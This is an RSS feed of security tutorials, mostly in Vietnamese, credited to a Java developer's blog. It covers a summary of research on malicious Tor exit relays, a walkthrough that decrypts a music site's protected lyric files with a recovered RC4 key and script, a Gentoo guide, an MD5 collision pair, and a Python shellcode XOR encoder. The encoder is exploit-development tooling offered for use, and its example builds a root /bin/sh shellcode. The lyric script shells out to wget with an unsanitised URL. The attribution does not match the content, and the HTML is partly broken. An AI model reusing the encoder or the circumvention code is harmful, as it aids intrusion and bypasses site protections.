<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
    <title>RealJenius.com - Category: tutorials</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Tor &#8211; Xác định các exit relay độc hại</title>
  <link>http://realjenius.com/tutorials/2014/08/14/tor-xac-dinh-cac-exit-relay-doc-hai.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2014-08-14T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2014/08/14/tor-xac-dinh-cac-exit-relay-doc-hai.html</guid>
  <description><![CDATA[
     <p><strong>1. Mở đầu</strong><br />
Bài viết này là phần mô tả sơ lược và bình luận bài báo “Spoiled Onions: Exposing Malicious Tor Exit Relays”[1].<br />
Tor exit relay là nút cuối dùng trong hành trình vận chuyển của các gói tin trọng mạng Tor, gói tin từ đây sẽ đi đến địa chỉ thực sự cần đến. Nó được vận hành bởi các người dùng tình nguyện trọng mạng và có thể nói tổng lưu lượng qua các exit relay này khá lớn (cỡ 1GB/s). Theo thiết kế, thì các người dùng ở các exit relay này có thể quan sát và thay đổi nội dung của các dữ liệu trong mạng.</p>

<p>Trong bài báo này, tác giả đề xuất các phương pháp để nhận ra các exit relay nào đang chơi bẩn và ghi lại những hành động của chúng. Họ xây dựng hai khung chương trình để phát hiện hoạt động bất thường của các exit relay. Một để chủ động phát hiện các hành động như thay đổi nội dung dữ liệu (Man in the middle), một là phần thụ động, để điều tra các exit relay sử dụng phương thức nghe lén (traffic sniff) để ăn cắp dữ liệu. Các giải pháp của tác giả được hiện thực chú trọng đến tính nhanh và hiệu quả trong quá trình quét các exit relay.</p>

<p><strong>2. Khái quát hoạt động của mạng Tor</strong></p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh5.googleusercontent.com/egeTOj-mT7_qWwI4Xf7KgME_Fj8MQG-ItYOu2MVslR7YV0ewpgIRn0AZzZwTvgvLDJEsN_BUBRAMOXbhIlh4H6pa8J7rQpg8Tlz6g5Efem02QRMHot07Z8BP4GuXuLmaAp1PMklJKjg" alt="" width="307px;" height="201px;" />
</p>

<p>Hình trên là mô hình 3 nút của mạng Tor, dữ liệu từ một tor client bất kì bắt đầu hành trình trong mạng thì nó sẽ đi qua:</p>

<ol>
  <li>Nút đầu (Entry guard): Đây này là nút đầu tiên trong hành trình của dữ liệu trong mạng.</li>
  <li>Nút giữa (Middle relay): là các nút trung chuyển dữ liệu trong mạng.</li>
  <li>Nút thoát (Exit relay): nút cuối hành trình của dữ liệu trọng mạng, đây là nút bắt cầu mà từ đây dữ liệu sẽ ra khỏi mạng mã hóa của Tor và đi đến đích nằm trong phần còn lại của thế giới – Internet. Dữ liệu – nếu có thể- sẽ bị nghe lén hoặc thay đổi ở nút này.</li>
</ol>

<p><strong>3. Giám sát các Tor exit relay:</strong><br />
Như đã nói ở trên, tác giả đã xây dựng hai khung chương trình nhằm giám sát các exit relay trong toàn bộ mạng Tor. Phần này chúng ta sẽ lần lượt đi qua quá trình thực hiện hai khung chương trình đó. Ngoài ra, tác giả có công bố mã nguồn của chúng ở đây[3].</p>

<p><strong>3.1 exitmap:</strong><br />
Đây là khung chương trình thứ nhất tác giả hiện thực, nó sẽ giám sát chủ động các exit relay trong việc thay đổi nội dụng dữ liệu của người dùng trong mạng.</p>

<p><strong><em>Thiết kế:</em></strong></p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh6.googleusercontent.com/u4TKbpaxg4s49fl5bApAyo2GaPjVFroZMzW9zFlerwcTddFnOM7j6ZR6EHcIAvenrcPhZq6ubTV84zf_NecFOKYNiujLLZM0fS1rhSUc7ZhCeOsRsJAR_F4WQCgUGmLVJMn-LumXD0g" alt="" width="331px;" height="216px;" />
</p>

<p>exitmap chạy trên một máy đơn lẻ, được xây dựng dựa vào thư viện python Stem – một thư viện hiện thực các giao thức Tor. Tác giả dùng Stem để khởi tạo và đóng các kết nối vào mạng. Bên cạnh đó cần một Tor client đang chạy để lấy các thông tin về các nút để biết đâu là các exit relay đang trực tuyến.</p>

<p><strong><em>Hoạt động:</em></strong></p>

<ol>
  <li>Đầu tiên, exitmap lấy toàn bộ các exit relay từ Tor client đang chạy. Thực hiện chọn ra một exit relay ngẫu nhiên để kiểm tra.</li>
  <li>Khởi tạo một vòng (circuit) dữ liệu trong mạng Tor với exit relay là nút được lấy ngẫu nhiên từ 1.</li>
  <li>Giao tiếp với Tor client để vận chuyển dữ liệu.</li>
</ol>

<p><strong><em>Nâng cao hiệu năng của thiết kế:</em></strong><br />
Với mô hình và hoạt động của hệ thống ở trên, dữ liệu từ exitmap vào mạng Tor và đi lòng vòng qua rất nhiều nút khác rồi mới đến exit relay chọn sẵn, nên hiệu năng không cao. Trong khi mục đích của việc kiểm tra này hoàn toàn không đòi hỏi tính ẩn danh của Tor mang lại, nên tác giả đã cải tiến thêm hệ thống như sau.</p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh4.googleusercontent.com/KTsL1X9oYrbghyBPrjO-2k6CL2gf8eG8C9Lbbj_5GwdwQYJR5iJK0hDOPYeivadYFMCr_PL6rAjhbDHJ06H3H4kvf4i8EYpBDa35pqcBcU-RHcmplOfbPgtuKe-5d0r_XT5ccEOhGEw" alt="" width="302px;" height="190px;" />
</p>

<p>Thay vì chạy lòng vòng trong mạng dẫn đến ảnh hưởng hiệu năng của việc kiểm tra, tác giả đề xuất mô hình: dữ liệu chỉ chạy qua một nút cố định rồi đi ngay đến exit relay.</p>

<p><strong><em>Phần quét:</em></strong><br />
Dựa vào exitmap được xây dựng như trên, tác giả viết thêm các phần kiểm tra cho các giao thức như HTTPs, XMPP, IMAPs, SSH, phát hiện sslstrip và phân giải DNS giả tạo.<br />
<em>Các phần quét kiểm tra dựa trên các giao thức HTTPs, XMPP, IMAPs và SSH:</em> đều được thực hiện thông qua việc kiểm tra chứng chỉ hợp lệ trả về khi dữ liệu đi qua mạng Tor. Một exit relay thực hiện MitM sẽ khiến cho chứng chỉ trả về không đúng như ý và từ đó phát hiện được hành vi MitM của exit relay đó.<br />
Hình dưới tác giả cung cấp một đoạn mã giả mô tả phần đã nói ở trên:</p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh5.googleusercontent.com/cAlohQ54Mm_7Xb-cHeI6SqXDZnFE9bnl_0dTbUv1j9Ikq94QQ9owdv9xNwVTESFEvze5pStzE406oXzMwAKWGRSAp5N0-pecfpYAIbNM7UbcPmHK18MXuhCwqpRclqtQD_RW" alt="" width="621px;" height="224px;" />
</p>

<p><em>Sslstrip:</em> Thay vì cố gắng quan sát dữ liệu đã được bảo vệ với kết nối TLS, kẻ tấn công sẽ cố gắng chuyển các đường dẫn từ https về http, từ đó dữ liệu được chuyển dưới dạng hoàn toàn minh bạch, và kẻ tấn công dễ dàng lấy cắp các dữ liệu chúng muốn. Để phát hiện việc “downgraded” này, phần quét sslstrip cố gắng phát hiện trong dữ liệu HTML các đường dẫn bị thay đổi từ HTTPS thành HTTP.</p>

<p><em>Phân giải DNS giả mạo</em>: Địa chỉ DNS cũng có thể được các client gửi đến exit relay để phân giải, việc này dẫn đến phía exit relay có thể giả mạo việc phân giải đó. Một mặt, các exit relay trong quá khứ có thể bị thiết lập sai khi dùng các DNS bị cản lọc – ví dụ như ở một số ISP ở Trung Quốc, Việt Nam, và một số nước châu âu. exitmap cũng sẽ phát hiện các phân giải DNS giả tạo này.</p>

<p><strong>3.2 HoneyConnector:</strong><br />
Khung chương trình này được xây dựng để phát hiện thụ động một vài exit relay đang cố gắng quan sát dữ liệu (sniffing) của người dùng Tor. Việc quan sát các dữ liệu này hầu hết là trên các giao thức không được mã hóa như là FTP, IMAP.</p>

<p><strong><em>Mô hình:</em></strong></p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh3.googleusercontent.com/NEuvLRGQZi6NpPeR8VEFxIhyd10MEGjEKnkBlQPjXma6n3rzOI1H-siwNvK2WDN_BJuVnKVy_KvXbDwfPvJzL-01COmODQLcuz7yoctqdkDDjdLA4OMkjwyaw5R1PlUCiGOt" alt="" width="576px;" height="296px;" />
</p>

<p><strong><em>Khung chương trình này hoạt động như sau:</em></strong><br />
Từ Tor client liên tục gửi đi các yêu cầu login đến “Destination Server” là các FTP/IMAP server với các thông tin đăng nhập user/pass được tạo sẵn, đồng thời gửi các thông tin đó đến server đích.<br />
Các thông tin đăng nhập trên được lưu trong database, bao gồm đã được gửi qua exit relay nào. Trong thời gian theo dõi (hàng tháng), nếu một thông tin đăng nhập nào đó được dùng để đăng nhập vào các FTP/IMAP server trên thì sẽ bị lưu lại và đối chiếu với thông tin trong cơ sở dữ liệu, tìm ra được exit relay nào đã tiến hành lấy cắp dữ liệu.</p>

<p>Phần còn lại của bài báo là các thông tin rút ra được từ kết quả kiểm tra của tác giả trong nhiều tháng liền. Trong phần đúc kết thông tin này, có nhiều thông tin rất thú vị, ví dụ như về một số nhóm chuyên đi lợi dụng các exit relay để sniffing, chèn thêm mã độc vào trang html, … Hình dưới liệt kê 40 exit relay mà tác giả đã kiểm tra được có hành vi nguy hiểm:</p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh5.googleusercontent.com/PN1ExhdM9z2CpzWbXfuSniUs_JV_fyvazqjQmyh5vXCsvlrEa1tS0XQ-4Fu20TIVjhRudYbmpLxI6Yh3Qa9PP67W06ypZYNlBupIHA7eOkNIsUJ_6v81cuwMsAT2WUYgY38U" alt="C:A31D5665347F1D4E-A7C2-4647-96EF-468158E00942_filesimage006.png" width="551px;" height="671px;" />
</p>

<p>Và các exit relay đã nghe lén để ăn cắp thông tin (đăng nhập) của người dùng Tor:</p>

<p style="text-align: center;">
  <img class="aligncenter" src="https://lh6.googleusercontent.com/TyO3KqIdmwZHVSp4e3lfpf570_CXC1z552vgEJFDgl-y6aJQ8UEwkoIKlO964hR5UzAkumblEDPBtN-L4kMQA_zrYv4WZQr6eys8ST3kT-QDPD1C5lmyePRIppFnmxcaZpbo" alt="C:A31D5665347F1D4E-A7C2-4647-96EF-468158E00942_filesimage007.png" width="584px;" height="466px;" />
</p>

<p>Các bạn đọc thêm ở tài liệu trong phần 4, các phần phân tích kết quả còn lại.</p>

<p>Phần còn lại trong bài báo là các phát triển thêm của tác giả cho trình duyệt Tor browser, để có thể phòng ngừa nếu một exit relay nào đó đang MitM, mà không hiểu gì về trang cảnh báo của trình duyệt. Thay vì để trình duyệt hiện cảnh báo thì Tor sẽ tự xác minh và từ bỏ ngay exit relay đang MitM đó. Các bạn đọc thêm trong phần 6 của bài báo.</p>

<p><strong>4. Tổng kết</strong><br />
Vậy dùng tor có an toàn không? Dù rằng bài báo đã cho thấy rằng có khả năng bị tấn công khi sử dụng Tor, tuy nhiên các tấn công này hoàn toàn là phòng ngừa được nếu như người dùng tôn trọng các nguyên tắc bảo mật (trong trường hợp bị MitM), và không dùng các giao thức cũ để đăng nhập (FTP/IMAP) để có thể dễ dàng bị đánh cắp dữ liệu.<br />
Gần đây cũng có một nghiên cứu về Tor nữa, nhưng đã bị hủy bỏ trước khi trình bày ở hội nghị Blackhat USA. Nghiên cứu này về vấn đề nặc danh của Tor. [2]<br />
Quay lại với bài báo, có cách nào có thể qua mặt được các kiểm tra như bài báo đã làm hay không. Và có cách nào để có thể ứng dụng vào Tor để phát hiện ngay tức thì các hành động gây hại ở exit relay và loại bỏ nó ra khỏi mạng. Mong các bạn thảo luận thêm <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<p>Tham khảo:</p>

<p>[1] https://petsymposium.org/2014/papers/Winter.pdf<br />
[2] http://freedomhacker.net/tor-project-fixing-vulnerability-that-could-expose-users/<br />
[3] http://www.cs.kau.se/philwint/spoiled_onions/</p>

  ]]></description>
</item>

	<item>
  <title>Lấy lời nhạc nhaccuatui.com</title>
  <link>http://realjenius.com/tutorials/2014/08/03/nhaccuatui-lyrics.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2014-08-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2014/08/03/nhaccuatui-lyrics.html</guid>
  <description><![CDATA[
     <p>Nhaccuatui vừa nâng cấp trình chơi nhạc trên web của mình có thể hiển thị lời nhạc theo thời gian khá tốt. Bài viết này sẽ trình bày các bước để lấy lời nhạc đó và cung cấp một công cụ để thực hiện trong 1 cú enter <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" /> (*).</p>

<p>Lấy một bài nhạc làm mẫu như bài <a href="http://www.nhaccuatui.com/bai-hat/loi-to-tinh-ong-buom-vu-hung.d1rchpsGUBfW.html">này</a>. Lời nhạc được hiện rất khớp với nhạc:</p>

<div id="attachment_1752" style="width: 405px" class="wp-caption aligncenter">
  <img class="size-full wp-image-1752" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/nctlyricshow.png" alt="nctlyricshow" width="395" height="133" /><p class="wp-caption-text">
    nctlyricshow
  </p>
</div>

<p>Đơn giản, xem mã nguồn của trang thử lời nhạc này lấy từ đâu:</p>

<p><a href="https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/htmlsourcecode/" rel="attachment wp-att-1753"><img class="aligncenter size-full wp-image-1753" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/htmlsourcecode.png" alt="htmlsourcecode" width="1352" height="133" /></a></p>

<p>Đúng là khúc này, đường dẫn <a href="https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/linkdescription/" rel="attachment wp-att-1754"><img class="alignnone size-full wp-image-1754" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/linkdescription.png" alt="linkdescription" width="548" height="17" /></a> là một mô tả cho bài nhạc ở trên, có chứa các thông tin của bài nhạc, bao gồm cả đường dẫn đến tệp lời nhạc:</p>

<p><a href="https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/songdescription/" rel="attachment wp-att-1761"><img class="aligncenter size-full wp-image-1761" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/songdescription.png" alt="songdescription" width="1138" height="399" /></a></p>

<p>Tải tệp Loi-To-Tinh-Ong-Buom-Vu-Hung.lrc (**) về, nhưng có một vấn đề, nó đã bị mã hóa thành như thế này:</p>

<p><a href="https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/lyricencrypted/" rel="attachment wp-att-1762"><img class="aligncenter size-full wp-image-1762" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/lyricencrypted.png" alt="lyricencrypted" width="1901" height="281" /></a></p>

<p>Làm thế nào đây, rỏ ràng là chương trình nghe nhạc của nhaccuatui hiển thị lời nhạc rất rỏ ràng. Bây giờ, phải tìm hiểu chương trình nghe nhạc này xử lý tệp tin lrc kia như thế nào. Decompile chương trình nghe nhạc của nhaccuatui bằng tiện ích ở đây http://www.showmycode.com/. Duyệt qua một chút mã nguồn thì sẽ thấy đoạn code này:</p>

<p><a href="https://www.vnsecurity.net/2014/08/nhaccuatui-lyrics/lrcdecrypt/" rel="attachment wp-att-1763"><img class="aligncenter size-full wp-image-1763" src="http://www.vnsecurity.net/wp/storage/uploads/2014/08/lrcdecrypt.png" alt="lrcdecrypt" width="598" height="90" /></a></p>

<p>Ở dưới là phần xử lý biến local5 để làm lời nhạc, từ đó ta có thể suy ra rằng tệp lrc kia đã được mã hóa bằng RC4, với khóa là đoạn:</p>

<pre class="brush: php; title: ; notranslate" title="">var _local3:ByteArray = Hex.toArray(Hex.fromString(irrcrpt('Mzs2dkvtu5odu', 1)));</pre>

<p>Chương trình chơi nhạc của nhaccuatui sử dụng **irrFuscator **để làm rối mã nguồn action script. Nhưng có một công cụ online để decrypt các chuỗi dùng irrFuscator này tại http://peniscorp.com/boombang/decrypt.php , dán đoạn code trên vào và ta sẽ có:</p>

<pre class="brush: css; title: ; notranslate" title="">var _local3:ByteArray = Hex.toArray(Hex.fromString('Lyr1cjust4nct'));</pre>

<p>Vậy là ta đã có ciphertext là tệp lrc, phương thức mã hóa là <strong>RC4 **với khóa là **Lyr1cjust4nct</strong>, công việc còn lại là giải mã tệp đó. Có thể dùng công cụ có sẵn trên mạng như: http://rc4.online-domain-tools.com/.</p>

<p>Phía dưới là mã nguồn mình viết để đơn giản hóa việc lấy lời nhạc này:</p>

<pre class="brush: css; title: ; notranslate" title="">import re
import httplib
import os
import sys

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))

    return ''.join(out)

if len(sys.argv) &amp;lt;= 2:
    print 'usage: python nctlyricdecryptor.py /bai-hat/loi-to-tinh-ong-buom-vu-hung.d1rchpsGUBfW.html'
    exit()

conn = httplib.HTTPConnection('www.nhaccuatui.com')
conn.request('GET', sys.argv[1])
r1 = conn.getresponse()
data1 = r1.read()
songdescript = 'http://www.nhaccuatui.com/flash/xml?key1=' + re.search('([a-fA-Fd]{32})', data1).group(0)

conn.request('GET', songdescript)
r1 = conn.getresponse()
data1 = r1.read()
m = re.search('http://lrc.nct.nixcdn.com/(.*)]', data1).group(0)[:-2]
print m
os.system('wget ' + m + ' -O lyric')
lyricencrypted = open('lyric').readline()

lyricdecrypted = rc4crypt(lyricencrypted.decode('hex'), 'Lyr1cjust4nct')

f = open('lyric', 'wb')
f.write(lyricdecrypted)
f.close()</pre>

<p><em>(</em>): Các bạn chịu hoàn toàn trách nhiệm trước pháp luật khi dùng chương trình này để lấy dữ liệu từ trang nhaccuatui.*<br />
<em>(**) http://en.wikipedia.org/wiki/LRC_(file_format)</em></p>


  ]]></description>
</item>

	<item>
  <title>Gentoo: How to install Zine+lighttpd in 5 minutes</title>
  <link>http://realjenius.com/tutorials/2009/12/03/gentoo-how-to-install-zine-lighttpd-in-5-minutes.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2009-12-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2009/12/03/gentoo-how-to-install-zine-lighttpd-in-5-minutes.html</guid>
  <description><![CDATA[
     <p>This is how you can get <a title="Zine" href="http://zine.pocoo.org/" target="_blank">Zine </a>+ <a title="Lighttpd" href="http://www.lighttpd.net/" target="_blank">lighty</a> running under <a title="Gentoo" href="http://www.gentoo.org" target="_blank">Gentoo</a> in 5 minutes</p>

<ol>
  <li><strong>Install the required python packages for Zine</strong>
&lt;pre class="brush: bash; light: true; title: ; notranslate" title=""&gt;(root) # cat &gt;&gt; /etc/portage/package.keywords
 dev-python/werkzeug
 dev-python/Babel
 dev-python/html5lib
 dev-python/flup
 dev-python/sqlalchemy</li>
</ol>

<p>(root) # emerge -av sqlalchemy jinja2 werkzeug simplejson html5lib pytz Babel lxml flup&lt;/pre&gt;</p>

<ol>
  <li><strong>Download and Install Zine</strong>
&lt;pre class="brush: bash; light: true; title: ; notranslate" title=""&gt;(download) $ wget http://zine.pocoo.org/releases/Zine-0.1.2.tar.gz
(download) $ tar zxvf Zine-0.1.2.tar.gz
(download) $ cd Zine-0.1.2</li>
</ol>

<h1 id="use---prefix-to-install-zine-to-a-different-location-than-default-usr">Use –prefix to install zine to a different location than default (/usr)</h1>
<p>(Zine-0.1.2) $ ./configure –prefix=/srv/usr &amp;&amp; make install</p>

<h1 id="create-a-working-directory-for-your-zine-fastcgi-and-configuration-files">Create a working directory for your Zine fastcgi and configuration files</h1>
<p>(Zine-0.1.2) $ mkdir -p /var/www/zine
(Zine-0.1.2) $ cp servers/zine.fcgi /var/www/zine</p>

<h1 id="edit-zinefcgi-to-update-instancefolder-and-zinelib">Edit zine.fcgi to update INSTANCE_FOLDER and ZINE_LIB</h1>
<p>(Zine-0.1.2) $ nano /var/www/zine/servers/zine.fcgi
&lt;/pre&gt;</p>

<blockquote>
  <p>INSTANCE_FOLDER = ‘/var/www/zine’<br />
ZINE_LIB = ‘/srv/usr/lib/zine’</p>
</blockquote>

<pre class="brush: bash; light: true; title: ; notranslate" title="">(Zine-0.1.2) $ chown lighttpd /var/www/zine
(Zine-0.1.2) $ chmod 755 /var/www/zine/zine.fcgi
</pre>

<ol>
  <li>** Update lighttpd configuration**
&lt;pre class="brush: bash; light: true; title: ; notranslate" title=""&gt;# Edit /etc/lighttpd/mod_fastcgi.conf for global fcgi handler setup or
# add fastcgi.server to your VHOST config
(root) # nano /etc/lighttpd/mod_fastcgi.conf</li>
</ol>
<p>&lt;/pre&gt;</p>

<blockquote>
  <p>fastcgi.server = (“” =&gt;<br />
((<br />
“bin-path” =&gt; “/var/www/zine/zine.fcgi”,<br />
“socket” =&gt; “/tmp/fcgi-zine.socket”,<br />
“check-local” =&gt; “disable”<br />
)))</p>
</blockquote>

<ol>
  <li><strong>Restart your lighttpd!</strong></li>
</ol>

  ]]></description>
</item>

	<item>
  <title>Just an MD5 collision pair</title>
  <link>http://realjenius.com/tutorials/2009/09/30/just-an-md5-collision-pair.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2009-09-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2009/09/30/just-an-md5-collision-pair.html</guid>
  <description><![CDATA[
     <p>Nothing much in this blog entry. If you’re lucky to land on this page via a Google search, this collision pair might help you.</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">9011f8697eddc718204b83a6c68bfc05fcd46b03bcfbdc8003763966e99d
907d8ef9f5e7ec6422694b0ec65cebad0b245a70d8c2390b3f1a451048a9
42a4af45dd7416abdcdbff2a67473e2d99a6c2814836ca470779e11ccd57
16c955697d1e0173d6da57ea8eb27bb7c5afa52951c8cdf09cc5c5718f5c
6c5037734bfea8e9
</pre>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">9011f8697eddc718204b83a6c68bfc05fcd46b83bcfbdc8003763966e99d
907d8ef9f5e7ec6422694b0ec65ceb2d0c245a70d8c2390b3f1a45104829
42a4af45dd7416abdcdbff2a67473e2d99a6c2814836cac70779e11ccd57
16c955697d1e0173d6da57ea8eb27bb7c5afa5a950c8cdf09cc5c5718f5c
6c5037f34bfea8e9
</pre>

  ]]></description>
</item>

	<item>
  <title>Python Shellcode Encoder</title>
  <link>http://realjenius.com/tutorials/2009/09/25/python-shellcode-encoder.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2009-09-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2009/09/25/python-shellcode-encoder.html</guid>
  <description><![CDATA[
     <p>At the moment, the package only sports two encoders: fnstenv and jmp/call encoders. Both are classic xor encoders. Hope you find it useful.</p>

<p>`
&lt;pre class="brush: python; gutter: true; title: ; notranslate" title=""&gt;
# Shellcode encoder to avoid NUL or special characters
#
# egg = inlineegg.InlineEgg(inlineegg.Linuxx86Syscall)
# egg.setreuid(0, 0)
# egg.execve(‘/bin/sh’, (‘/bin/sh’, ‘-i’))
# shellcode = egg.getCode()
# encoder = FnstenvXorEncoder()
# bytes = encoder.encode(shellcode)
# shellcode = ‘‘.join(chr(x) for x in bytes)
#
# if encode() raises EncoderError, if may be due to your shellcode’s length is
# divisible by 256. Putting in a NOP and try again.
#
# Copyright 2007 Nam T. Nguyen, distributed under the BSD license</p>

<p>import types
import unittest</p>

<p>class EncoderError(Exception):
    pass</p>

<p>class Encoder(object):</p>

<pre><code>def encode(self, payload):
    return payload
</code></pre>

<p>class XorEncoder(Encoder):</p>

<pre><code>def __init__(self, disallowed_chars=(0x00, 0x0D, 0x0A)):
    self._disallowed_chars = set(disallowed_chars)
    self._usable_chars = set(range(256)) - self._disallowed_chars

def _get_supported_register_sets(self):
    return []

def _get_register_set(self, register_set):
    return {}

def _get_header(self):
    return []

def _get_payload_size_position(self):
    raise NotImplementedError()

def _get_xor_key_position(self):
    raise NotImplementedError()

def _encode_payload(self, payload, register_sets):
    buffer = []
    if isinstance(payload, types.StringTypes):
        buffer.extend(ord(x) &amp; 0xFF for x in payload)
    else:
        buffer.extend(payload)

    for c in self._usable_chars:
        ret = buffer[:]
        for i in range(len(ret)):
            ret[i] = ret[i] ^ c
            if ret[i] in self._disallowed_chars:
                # break inner for
                break
        else:
            self._xor_key = c
            # break outer for
            break
    else:
        raise EncoderError('cannot encode')

    return ret

def _prefix_header(self, payload, register_sets):
    ret = self._get_header()

    payload_len = 0x10000 - len(payload)
    payload_size_pos = self._get_payload_size_position()
    ret[payload_size_pos] = payload_len &amp; 0xFF
    ret[payload_size_pos + 1] = (
        (payload_len &amp; 0xFF00) &gt;&gt; 8)

    xor_key_pos = self._get_xor_key_position()
    for reg_set in register_sets:
        for pos, value in self._get_register_set(reg_set).iteritems():
            ret[pos] = value
        for i, c in enumerate(ret):
            if (c in self._disallowed_chars) and (
                i != xor_key_pos):
                # break the inner for
                break
        else:
            # break the outter for
            break
    else:
        raise EncoderError('cannot encode')

    ret[xor_key_pos] = self._xor_key
    ret.extend(payload)

    return ret

def encode(self, payload, register_sets=[]):
    """Encode payload.

    :param payload: the payload, either a string or a sequence of bytes
    :param register_sets: a sequence of registers to try in shellcode
    header. Sample names include 'eax', 'edx', and 'ebx'.
    :return: a sequence of encoded bytes
    """
    if len(payload) == 0:
        return []

    if len(payload) &gt; 65535:
        raise EncoderError('cannot encode')

    if not self._usable_chars:
        raise EncoderError('cannot encode')

    if not register_sets:
        register_sets = self._get_supported_register_sets()

    encoded_payload = self._encode_payload(payload, register_sets)
    ret = self._prefix_header(encoded_payload, register_sets)

    return ret

def encode_to_string(self, payload, register_sets=[]):
    """Encode payload. Return a string.

    :see: encode
    """
    return ''.join(chr(x) for x in self.encode(payload, register_sets))
</code></pre>

<p>class FnstenvXorEncoder(XorEncoder):
    “"”Fnstenv Xor based on</p>

<p>http://www.metasploit.com/sc/x86_fnstenv_xor_byte.asm.”””</p>

<pre><code>HEADER = [
    0xD9, 0xE1,                    # fabs
    0xD9, 0x34, 0x24,              # fnstenv [esp]
    0x5A,                          # pop edx
    0x5A,                          # pop edx
    0x5A,                          # pop edx
    0x5A,                          # pop edx
    0x80, 0xEA, 0xE7,              # sub dl,-25     (offset to payload)
    0x31, 0xC9,                    # xor ecx,ecx
    0x66, 0x81, 0xE9, 0xA1, 0xFE,  # sub cx,-0x15F  (0x15F is size of payload)
    0x80, 0x32, 0x99,              # decode: xor byte [edx],0x99
    0x42,                          # inc edx
    0xE2, 0xFA,                    # loop decode
    # payload goes here
]

REGISTER_SET = {
    'edx' : {5: 0x5A, 6: 0x5A, 7: 0x5A, 8: 0x5A, 9: 0x80, 10: 0xEA,
             20: 0x32, 22: 0x42},
    'eax' : {5: 0x58, 6: 0x58, 7: 0x58, 8: 0x58, # 9: 0x90, 10: 0x2C,
             9: 0x80, 10: 0xE8,
             20: 0x30, 22: 0x40},
    'ebx' : {5: 0x5B, 6: 0x5B, 7: 0x5B, 8: 0x5B, 9: 0x80, 10: 0xEB,
             20: 0x33, 22: 0x43},
}

XOR_KEY_POSITION = 21

PAYLOAD_SIZE_POSITION = 17         # 17 and 18

def _get_supported_register_sets(self):
    return FnstenvXorEncoder.REGISTER_SET.keys()

def _get_register_set(self, register_set):
    return FnstenvXorEncoder.REGISTER_SET[register_set]

def _get_header(self):
    return FnstenvXorEncoder.HEADER[:]

def _get_payload_size_position(self):
    return FnstenvXorEncoder.PAYLOAD_SIZE_POSITION

def _get_xor_key_position(self):
    return FnstenvXorEncoder.XOR_KEY_POSITION
</code></pre>

<p>class JumpCallXorEncoder(XorEncoder):
    HEADER = [
        0xeb, 0x10,                    # jmp getdata
        0x5b,                          # begin: pop ebx
        0x31, 0xc9,                    # xor ecx, ecx
        0x66, 0x81, 0xe9, 0xa1, 0xfe,  # sub cx, -0x15F
        0x80, 0x33, 0x99,              # decode: xor byte[ebx], 0x99
        0x43,                          # inc ebx
        0xe2, 0xfa,                    # loop decode
        0xeb, 0x05,                    # jmp payload
        0xe8, 0xeb, 0xff, 0xff, 0xff,  # getdata: call begin
        # payload goes here            # payload:
    ]</p>

<pre><code>REGISTER_SET = {
    'eax': {2: 0x58, 11: 0x30, 13: 0x40},
    'ebx': {2: 0x5b, 11: 0x33, 13: 0x43},
    'edx': {2: 0x5a, 11: 0x32, 13: 0x42},
}

XOR_KEY_POSITION = 12

PAYLOAD_SIZE_POSITION = 8

def _get_header(self):
    return JumpCallXorEncoder.HEADER[:]

def _get_supported_register_sets(self):
    return JumpCallXorEncoder.REGISTER_SET.keys()

def _get_register_set(self, register_set):
    return JumpCallXorEncoder.REGISTER_SET[register_set]

def _get_payload_size_position(self):
    return JumpCallXorEncoder.PAYLOAD_SIZE_POSITION

def _get_xor_key_position(self):
    return JumpCallXorEncoder.XOR_KEY_POSITION
</code></pre>

<p>class TestFnstenvXorEncoder(unittest.TestCase):</p>

<pre><code>def testEmptyShellcode(self):
    encoder = FnstenvXorEncoder()
    self.assertEqual([], encoder.encode(""))

def testRegisterSet(self):
    encoder = FnstenvXorEncoder()
    ret = encoder.encode("x00", ['edx'])
    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                           0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x01, 0x42, 0xe2,
                           0xfa, 0x01])
    ret = encoder.encode("x00", ['eax'])
